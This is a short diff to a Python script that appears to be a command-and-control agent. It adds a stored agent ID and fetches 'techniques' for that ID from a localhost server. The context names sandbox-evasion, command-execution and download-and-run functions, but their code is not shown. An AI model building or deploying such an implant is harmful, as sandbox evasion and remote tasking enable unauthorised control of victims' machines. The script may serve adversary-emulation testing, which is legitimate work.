@@ -14,16 +14,20 @@ headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/
                          ' (KHTML, like Gecko) Chrome/78.0.3904.97 Safa'}
 TIMEOUT = 15
 executed = []
-
+agent_id = 0
 THIS_DIR = Path(__file__).parent
 
 
 def config_file():
     config = configparser.ConfigParser()
+    global agent_id
     if not os.path.exists(path=THIS_DIR / 'config.ini'):
         config['AGENT'] = {'id': randrange(500)}
         with open('config.ini', 'w') as configfile:
             config.write(configfile)
+
+    config.read('config.ini')
+    agent_id = config['AGENT']['id']
 
 
 def execute_command(command_issued):
@@ -68,7 +72,7 @@ def register():
 
 
 def get_techniques():
-    url = 'http://localhost:8000/agent_techniques/5'
+    url = ('http://localhost:8000/agent_techniques/%s' % agent_id)
     req = http.request('GET', url, headers=headers)
     response = str(req.data.decode('utf-8'))
     # print('Response code: ' + str(req.status))
@@ -166,8 +170,9 @@ if __name__ == '__main__':
     print('Agent running')
     sandbox_evasion()
     config_file()
-    # techs = get_techniques()
-    # print(techs)
+    print(agent_id)
+    techs = get_techniques()
+    print(techs)
     # results = download_and_run_commands()
     # print(results)
 
